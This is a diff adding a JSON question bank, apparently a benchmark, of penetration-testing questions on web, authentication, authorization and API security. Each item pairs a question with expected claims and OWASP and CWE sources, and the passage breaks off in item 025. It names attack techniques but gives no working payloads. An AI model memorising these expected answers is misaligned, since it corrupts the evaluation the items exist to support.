@@ -1,0 +1,3650 @@
+[
+  {
+    "query_id": "VAPT-QB-001",
+    "question": "What is Server-Side Request Forgery (SSRF) and how does blind SSRF differ from in-band SSRF?",
+    "domain": "WEB_SECURITY",
+    "subdomain": "SSRF",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "SSRF",
+      "Blind SSRF",
+      "In-band SSRF",
+      "Internal Network Access",
+      "Metadata Endpoints"
+    ],
+    "expected_answer_characteristics": [
+      "SSRF induces server to make requests to unauthorized destinations",
+      "In-band returns response payload to client",
+      "Blind relies on out-of-band network interactions"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP",
+      "CWE-918",
+      "PortSwigger Web Security Academy"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "OWASP",
+      "CWE-918",
+      "PortSwigger Web Security Academy"
+    ],
+    "expected_claims": [
+      "SSRF induces server to make requests to unauthorized destinations",
+      "In-band returns response payload to client",
+      "Blind relies on out-of-band network interactions"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-002",
+    "question": "Compare Server-Side Request Forgery (SSRF) and Cross-Site Request Forgery (CSRF). Where do the requests originate and what are the trust boundaries?",
+    "domain": "WEB_SECURITY",
+    "subdomain": "SSRF_VS_CSRF",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "SSRF",
+      "CSRF",
+      "Originating context",
+      "Trust boundaries",
+      "Client vs Server execution"
+    ],
+    "expected_answer_characteristics": [
+      "CSRF forces victim browser to issue authenticated requests",
+      "SSRF forces backend server to issue requests behind firewall",
+      "CSRF targets user session trust while SSRF targets server network trust"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP",
+      "CWE-918",
+      "CWE-352"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "comparison",
+    "expected_sources": [
+      "OWASP",
+      "CWE-918",
+      "CWE-352"
+    ],
+    "expected_claims": [
+      "CSRF forces victim browser to issue authenticated requests",
+      "SSRF forces backend server to issue requests behind firewall",
+      "CSRF targets user session trust while SSRF targets server network trust"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-003",
+    "question": "How does HTTP Request Smuggling (CL.TE vs TE.CL) operate when front-end proxies and back-end servers disagree on message boundaries?",
+    "domain": "WEB_SECURITY",
+    "subdomain": "HTTP_REQUEST_SMUGGLING",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "HTTP Request Smuggling",
+      "Content-Length",
+      "Transfer-Encoding",
+      "Front-end Proxy",
+      "RFC 7230"
+    ],
+    "expected_answer_characteristics": [
+      "CL.TE front-end uses Content-Length while back-end uses Transfer-Encoding",
+      "Ambiguity causes back-end to treat remaining bytes as the start of next request",
+      "RFC 7230 mandates rejecting or prioritizing chunked over Content-Length"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "RFC 7230",
+      "PortSwigger",
+      "CWE-444"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "protocol_analysis",
+    "expected_sources": [
+      "RFC 7230",
+      "PortSwigger",
+      "CWE-444"
+    ],
+    "expected_claims": [
+      "CL.TE front-end uses Content-Length while back-end uses Transfer-Encoding",
+      "Ambiguity causes back-end to treat remaining bytes as the start of next request",
+      "RFC 7230 mandates rejecting or prioritizing chunked over Content-Length"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-004",
+    "question": "What is the systematic methodology for validating Time-Based Blind SQL Injection using database sleep primitives without corrupting data?",
+    "domain": "WEB_SECURITY",
+    "subdomain": "SQLI",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Time-Based Blind SQLi",
+      "Sleep Primitives",
+      "pg_sleep",
+      "WAITFOR DELAY",
+      "Negative Controls"
+    ],
+    "expected_answer_characteristics": [
+      "Use deterministic delay functions to confirm boolean evaluations",
+      "Benchmark baseline response latency prior to injection",
+      "Verify negative control conditions do not trigger delays"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP WSTG-INPV-05",
+      "CWE-89"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "OWASP WSTG-INPV-05",
+      "CWE-89"
+    ],
+    "expected_claims": [
+      "Use deterministic delay functions to confirm boolean evaluations",
+      "Benchmark baseline response latency prior to injection",
+      "Verify negative control conditions do not trigger delays"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-005",
+    "question": "Compare Reflected, Stored, and DOM-based Cross-Site Scripting (XSS) in terms of persistence and source-to-sink execution paths.",
+    "domain": "WEB_SECURITY",
+    "subdomain": "XSS",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "Reflected XSS",
+      "Stored XSS",
+      "DOM XSS",
+      "Execution sink",
+      "Taint flow"
+    ],
+    "expected_answer_characteristics": [
+      "Reflected executes immediately in response to user payload",
+      "Stored persists payload in storage backend for future viewers",
+      "DOM XSS occurs entirely within browser document modification without server reflection"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP WSTG-INPV-01",
+      "CWE-79"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "comparison",
+    "expected_sources": [
+      "OWASP WSTG-INPV-01",
+      "CWE-79"
+    ],
+    "expected_claims": [
+      "Reflected executes immediately in response to user payload",
+      "Stored persists payload in storage backend for future viewers",
+      "DOM XSS occurs entirely within browser document modification without server reflection"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-006",
+    "question": "Explain Server-Side Template Injection (SSTI) in Jinja2 and how attackers traverse Python MRO to reach subprocess execution.",
+    "domain": "WEB_SECURITY",
+    "subdomain": "SSTI",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "SSTI",
+      "Jinja2",
+      "Python MRO",
+      "__subclasses__",
+      "os.popen",
+      "subprocess"
+    ],
+    "expected_answer_characteristics": [
+      "Template engine evaluates user input as template code",
+      "Accessing object subclasses via MRO allows locating os or subprocess modules",
+      "Sandboxes often circumvented via attribute reflection"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP",
+      "CWE-1336"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "OWASP",
+      "CWE-1336"
+    ],
+    "expected_claims": [
+      "Template engine evaluates user input as template code",
+      "Accessing object subclasses via MRO allows locating os or subprocess modules",
+      "Sandboxes often circumvented via attribute reflection"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-007",
+    "question": "How does XML External Entity (XXE) injection lead to local file disclosure and what parser configuration flags remediate it in Java XML parsers?",
+    "domain": "WEB_SECURITY",
+    "subdomain": "XXE",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "XXE",
+      "DOCTYPE",
+      "SYSTEM entity",
+      "DocumentBuilderFactory",
+      "disallow-doctype-decl"
+    ],
+    "expected_answer_characteristics": [
+      "External general entities read URI resources like file://",
+      "Remediate by setting FEATURE_SECURE_PROCESSING and disallowing DOCTYPE declarations"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP XXE Prevention Cheat Sheet",
+      "CWE-611"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "defensive_mitigation",
+    "expected_sources": [
+      "OWASP XXE Prevention Cheat Sheet",
+      "CWE-611"
+    ],
+    "expected_claims": [
+      "External general entities read URI resources like file://",
+      "Remediate by setting FEATURE_SECURE_PROCESSING and disallowing DOCTYPE declarations"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-008",
+    "question": "Explain the mechanics of Insecure Deserialization in Java and how gadget chains like Apache Commons Collections execute arbitrary code.",
+    "domain": "WEB_SECURITY",
+    "subdomain": "DESERIALIZATION",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "Insecure Deserialization",
+      "Java readObject",
+      "Gadget Chains",
+      "Commons Collections",
+      "InvokerTransformer"
+    ],
+    "expected_answer_characteristics": [
+      "readObject deserializes serialized object state triggering dynamic method dispatch",
+      "Gadget chains chain legitimate classes to achieve dangerous reflection or process invocation"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP WSTG-INPV-15",
+      "CWE-502"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "OWASP WSTG-INPV-15",
+      "CWE-502"
+    ],
+    "expected_claims": [
+      "readObject deserializes serialized object state triggering dynamic method dispatch",
+      "Gadget chains chain legitimate classes to achieve dangerous reflection or process invocation"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-009",
+    "question": "How does Object Prototype Pollution occur in JavaScript during recursive object merges and how can it lead to Remote Code Execution?",
+    "domain": "WEB_SECURITY",
+    "subdomain": "PROTOTYPE_POLLUTION",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "Prototype Pollution",
+      "__proto__",
+      "constructor.prototype",
+      "recursive merge",
+      "Node.js child_process"
+    ],
+    "expected_answer_characteristics": [
+      "Unsanitized property assignment to __proto__ modifies Object.prototype for all objects",
+      "Polluting env, shell, or argv properties triggers RCE when child processes spawn"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "CWE-1321",
+      "PortSwigger Research"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "code_analysis",
+    "expected_sources": [
+      "CWE-1321",
+      "PortSwigger Research"
+    ],
+    "expected_claims": [
+      "Unsanitized property assignment to __proto__ modifies Object.prototype for all objects",
+      "Polluting env, shell, or argv properties triggers RCE when child processes spawn"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-010",
+    "question": "Explain directory path traversal, path normalization bypasses (e.g., URL-encoding, null-byte, dot-dot-slash variations), and proper path validation.",
+    "domain": "WEB_SECURITY",
+    "subdomain": "PATH_TRAVERSAL",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "Path Traversal",
+      "Canonicalization",
+      "URL-encoding",
+      "..;/",
+      "realpath"
+    ],
+    "expected_answer_characteristics": [
+      "Traversing directory delimiters escapes intended web root directory",
+      "Validating normalized absolute path against authorized root prevents traversal"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP WSTG-ATHZ-01",
+      "CWE-22"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "OWASP WSTG-ATHZ-01",
+      "CWE-22"
+    ],
+    "expected_claims": [
+      "Traversing directory delimiters escapes intended web root directory",
+      "Validating normalized absolute path against authorized root prevents traversal"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-011",
+    "question": "What is the comprehensive testing methodology for validating unrestricted file upload vulnerabilities?",
+    "domain": "WEB_SECURITY",
+    "subdomain": "FILE_UPLOAD",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "File Upload",
+      "MIME type validation",
+      "Extension blacklist bypass",
+      "Double extension",
+      "Polyglot files",
+      "Content-Disposition"
+    ],
+    "expected_answer_characteristics": [
+      "Test client-side vs server-side extension and MIME validation",
+      "Examine execution permissions in storage directory",
+      "Verify content inspection and file renaming"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP WSTG-BUSL-08",
+      "CWE-434"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "OWASP WSTG-BUSL-08",
+      "CWE-434"
+    ],
+    "expected_claims": [
+      "Test client-side vs server-side extension and MIME validation",
+      "Examine execution permissions in storage directory",
+      "Verify content inspection and file renaming"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-012",
+    "question": "How do Limit-Overrun Race Conditions operate in financial/e-commerce endpoints and how do HTTP/2 single-packet techniques assist testing?",
+    "domain": "WEB_SECURITY",
+    "subdomain": "RACE_CONDITIONS",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "Race Conditions",
+      "Limit-Overrun",
+      "TOCTOU",
+      "HTTP/2 Single Packet Attack",
+      "Database Locking"
+    ],
+    "expected_answer_characteristics": [
+      "Simultaneous requests enter validation window before state write occurs",
+      "HTTP/2 multiplexing allows sending requests in single TCP packet to minimize network jitter"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "PortSwigger Smashing the State Machine",
+      "CWE-362"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "PortSwigger Smashing the State Machine",
+      "CWE-362"
+    ],
+    "expected_claims": [
+      "Simultaneous requests enter validation window before state write occurs",
+      "HTTP/2 multiplexing allows sending requests in single TCP packet to minimize network jitter"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-013",
+    "question": "Explain JSON Web Token (JWT) architecture and key security weaknesses including 'none' algorithm and HMAC/RSA key confusion.",
+    "domain": "AUTHENTICATION",
+    "subdomain": "JWT",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "JWT",
+      "RFC 7519",
+      "alg: none",
+      "Key Confusion Attack",
+      "kid injection",
+      "Signature Verification"
+    ],
+    "expected_answer_characteristics": [
+      "JWT consists of Base64URL header, payload, and signature",
+      "Algorithm none allows skipping signature verification",
+      "Key confusion treats RSA public key as HMAC secret key"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "RFC 7519",
+      "RFC 8725",
+      "OWASP JWT Cheat Sheet",
+      "CWE-347"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "RFC 7519",
+      "RFC 8725",
+      "OWASP JWT Cheat Sheet",
+      "CWE-347"
+    ],
+    "expected_claims": [
+      "JWT consists of Base64URL header, payload, and signature",
+      "Algorithm none allows skipping signature verification",
+      "Key confusion treats RSA public key as HMAC secret key"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-014",
+    "question": "How does the OAuth 2.0 Authorization Code Flow with PKCE function, and what vulnerability does PKCE mitigate compared to standard code flow?",
+    "domain": "AUTHENTICATION",
+    "subdomain": "OAUTH2",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "OAuth 2.0",
+      "PKCE",
+      "code_verifier",
+      "code_challenge",
+      "Authorization Code Interception",
+      "RFC 7636"
+    ],
+    "expected_answer_characteristics": [
+      "PKCE binds authorization code to initial client request via cryptographic verifier",
+      "Mitigates authorization code interception attacks on public clients without client secret"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "RFC 6749",
+      "RFC 7636",
+      "OWASP OAuth 2.0 Cheat Sheet"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "protocol_analysis",
+    "expected_sources": [
+      "RFC 6749",
+      "RFC 7636",
+      "OWASP OAuth 2.0 Cheat Sheet"
+    ],
+    "expected_claims": [
+      "PKCE binds authorization code to initial client request via cryptographic verifier",
+      "Mitigates authorization code interception attacks on public clients without client secret"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-015",
+    "question": "Explain SAML 2.0 XML Signature Wrapping (XSW) attacks and how signature verification can be decoupled from asserted identity.",
+    "domain": "AUTHENTICATION",
+    "subdomain": "SAML",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "SAML 2.0",
+      "XML Signature Wrapping",
+      "XSW",
+      "Assertion",
+      "DigestValue",
+      "ID reference"
+    ],
+    "expected_answer_characteristics": [
+      "SAML signature verifies digest of referenced XML element ID",
+      "XSW moves original signed element while parser reads malicious cloned assertion without valid signature check"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP SAML Security Cheat Sheet",
+      "CWE-347"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "protocol_analysis",
+    "expected_sources": [
+      "OWASP SAML Security Cheat Sheet",
+      "CWE-347"
+    ],
+    "expected_claims": [
+      "SAML signature verifies digest of referenced XML element ID",
+      "XSW moves original signed element while parser reads malicious cloned assertion without valid signature check"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-016",
+    "question": "What is Session Fixation and how does renewing session identifiers upon privilege transition mitigate it?",
+    "domain": "AUTHENTICATION",
+    "subdomain": "SESSION_MANAGEMENT",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "Session Fixation",
+      "Session ID Regeneration",
+      "Set-Cookie",
+      "Cookie Flags"
+    ],
+    "expected_answer_characteristics": [
+      "Attacker pre-sets session ID for victim before authentication",
+      "Regenerating session ID upon login invalidates pre-authentication identifier"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP WSTG-SESS-03",
+      "CWE-384"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "OWASP WSTG-SESS-03",
+      "CWE-384"
+    ],
+    "expected_claims": [
+      "Attacker pre-sets session ID for victim before authentication",
+      "Regenerating session ID upon login invalidates pre-authentication identifier"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-017",
+    "question": "What are common test scenarios for multi-factor authentication (MFA) bypass in web applications?",
+    "domain": "AUTHENTICATION",
+    "subdomain": "MFA_BYPASS",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "MFA Bypass",
+      "Forced Browsing",
+      "Response Manipulation",
+      "Token Brute Force",
+      "Session Reuse",
+      "OAuth fallback"
+    ],
+    "expected_answer_characteristics": [
+      "Verify endpoint access without completing MFA step",
+      "Test brute force resistance on OTP tokens",
+      "Check whether password reset flows drop MFA requirements"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP WSTG-ATHN-05",
+      "CWE-308"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "OWASP WSTG-ATHN-05",
+      "CWE-308"
+    ],
+    "expected_claims": [
+      "Verify endpoint access without completing MFA step",
+      "Test brute force resistance on OTP tokens",
+      "Check whether password reset flows drop MFA requirements"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-018",
+    "question": "What is the fundamental difference between Authentication and Authorization in system security architecture?",
+    "domain": "AUTHENTICATION",
+    "subdomain": "AUTH_VS_AUTHZ",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "Authentication (401)",
+      "Authorization (403)",
+      "Identity proof",
+      "Access control policy",
+      "Subject permissions"
+    ],
+    "expected_answer_characteristics": [
+      "Authentication verifies who the user is (identity)",
+      "Authorization determines what an authenticated subject is permitted to do"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "NIST SP 800-63",
+      "OWASP ASVS V2 & V4"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "comparison",
+    "expected_sources": [
+      "NIST SP 800-63",
+      "OWASP ASVS V2 & V4"
+    ],
+    "expected_claims": [
+      "Authentication verifies who the user is (identity)",
+      "Authorization determines what an authenticated subject is permitted to do"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-019",
+    "question": "Explain the difference and historical lineage between Insecure Direct Object References (IDOR) and Broken Object Level Authorization (BOLA).",
+    "domain": "AUTHORIZATION",
+    "subdomain": "IDOR_VS_BOLA",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "IDOR",
+      "BOLA",
+      "OWASP Top 10 2007 A4",
+      "OWASP API Security Top 10 API1:2023",
+      "Object Identifier Access"
+    ],
+    "expected_answer_characteristics": [
+      "IDOR coined in OWASP Top 10 2007 referring to direct references without access control",
+      "BOLA is modern API reformulation emphasizing object-level permission enforcement in microservices"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP Top 10",
+      "OWASP API Security Top 10",
+      "CWE-639"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "comparison",
+    "expected_sources": [
+      "OWASP Top 10",
+      "OWASP API Security Top 10",
+      "CWE-639"
+    ],
+    "expected_claims": [
+      "IDOR coined in OWASP Top 10 2007 referring to direct references without access control",
+      "BOLA is modern API reformulation emphasizing object-level permission enforcement in microservices"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-020",
+    "question": "What is Broken Function Level Authorization (BFLA) and how does it differ from BOLA in modern REST architectures?",
+    "domain": "AUTHORIZATION",
+    "subdomain": "BFLA",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "BFLA",
+      "BOLA",
+      "Administrative Endpoints",
+      "HTTP Verb Tampering",
+      "Role Hierarchies"
+    ],
+    "expected_answer_characteristics": [
+      "BOLA involves accessing another user's object at same privilege level",
+      "BFLA involves regular user invoking privileged administrative functions or methods"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP API Security API5:2023",
+      "CWE-285"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "OWASP API Security API5:2023",
+      "CWE-285"
+    ],
+    "expected_claims": [
+      "BOLA involves accessing another user's object at same privilege level",
+      "BFLA involves regular user invoking privileged administrative functions or methods"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-021",
+    "question": "How should a penetration tester systematically evaluate multi-tenant data isolation bypasses in SaaS environments?",
+    "domain": "AUTHORIZATION",
+    "subdomain": "TENANT_ISOLATION",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "Multi-tenancy",
+      "Tenant Isolation",
+      "Cross-tenant access",
+      "Tenant ID parameter",
+      "Row-level security"
+    ],
+    "expected_answer_characteristics": [
+      "Provision two distinct tenant accounts Tenant A and Tenant B",
+      "Attempt cross-tenant object mutation and read requests",
+      "Evaluate background job and asynchronous queue tenant segregation"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP ASVS V4.1",
+      "CWE-284"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "OWASP ASVS V4.1",
+      "CWE-284"
+    ],
+    "expected_claims": [
+      "Provision two distinct tenant accounts Tenant A and Tenant B",
+      "Attempt cross-tenant object mutation and read requests",
+      "Evaluate background job and asynchronous queue tenant segregation"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-022",
+    "question": "Compare horizontal and vertical privilege escalation with concrete examples in web applications.",
+    "domain": "AUTHORIZATION",
+    "subdomain": "PRIVILEGE_ESCALATION",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "Horizontal Privilege Escalation",
+      "Vertical Privilege Escalation",
+      "Peer user access",
+      "Administrator escalation"
+    ],
+    "expected_answer_characteristics": [
+      "Horizontal access grants unauthorized resources belonging to user with identical privilege tier",
+      "Vertical access escalates lower-tier user into higher privilege administrative tier"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP WSTG-ATHZ-02",
+      "OWASP WSTG-ATHZ-03",
+      "CWE-269"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "comparison",
+    "expected_sources": [
+      "OWASP WSTG-ATHZ-02",
+      "OWASP WSTG-ATHZ-03",
+      "CWE-269"
+    ],
+    "expected_claims": [
+      "Horizontal access grants unauthorized resources belonging to user with identical privilege tier",
+      "Vertical access escalates lower-tier user into higher privilege administrative tier"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-023",
+    "question": "Explain Mass Assignment (Auto-binding) vulnerabilities in modern web frameworks (Spring, Rails, Express) and how to prevent them with DTOs.",
+    "domain": "API_SECURITY",
+    "subdomain": "MASS_ASSIGNMENT",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Mass Assignment",
+      "Auto-binding",
+      "Over-posting",
+      "Data Transfer Objects (DTO)",
+      "Allowlist binding"
+    ],
+    "expected_answer_characteristics": [
+      "Framework binds request JSON directly to database entity model",
+      "Attackers inject unauthorized properties like isAdmin: true",
+      "Prevent using explicit Data Transfer Objects with strict property mapping"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP API Security API6:2023",
+      "CWE-915"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "code_analysis",
+    "expected_sources": [
+      "OWASP API Security API6:2023",
+      "CWE-915"
+    ],
+    "expected_claims": [
+      "Framework binds request JSON directly to database entity model",
+      "Attackers inject unauthorized properties like isAdmin: true",
+      "Prevent using explicit Data Transfer Objects with strict property mapping"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-024",
+    "question": "What are common security risks in GraphQL APIs including introspection, query depth exhaustion, and batching attacks?",
+    "domain": "API_SECURITY",
+    "subdomain": "GRAPHQL",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "GraphQL",
+      "Schema Introspection",
+      "Query Depth Limits",
+      "Circular Queries",
+      "Batching Abuse"
+    ],
+    "expected_answer_characteristics": [
+      "Introspection exposes private schema and documentation",
+      "Unrestricted nested queries lead to DoS via CPU/memory exhaustion",
+      "Batching allows bypassing rate limits on authentication mutations"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP GraphQL Cheat Sheet",
+      "CWE-400"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "OWASP GraphQL Cheat Sheet",
+      "CWE-400"
+    ],
+    "expected_claims": [
+      "Introspection exposes private schema and documentation",
+      "Unrestricted nested queries lead to DoS via CPU/memory exhaustion",
+      "Batching allows bypassing rate limits on authentication mutations"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-025",
+    "question": "How do distributed API rate limiting bypasses occur through IP spoofing headers (X-Forwarded-For, Client-IP) and header manipulation?",
+    "domain": "API_SECURITY",
+    "subdomain": "RATE_LIMITING",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Rate Limiting",
+      "X-Forwarded-For",
+      "True-Client-IP",
+      "Reverse Proxy Trust",
+      "Rate limit bypass"
+    ],
+    "expected_answer_characteristics": [
+      "Rate limiter trusting unvalidated client IP header allows rotating fake IP values",
+      "Reverse proxies must strip or overwrite untrusted upstream proxy headers"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP API Security API4:2023",
+      "CWE-770"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "OWASP API Security API4:2023",
+      "CWE-770"
+    ],
+    "expected_claims": [
+      "Rate limiter trusting unvalidated client IP header allows rotating fake IP values",
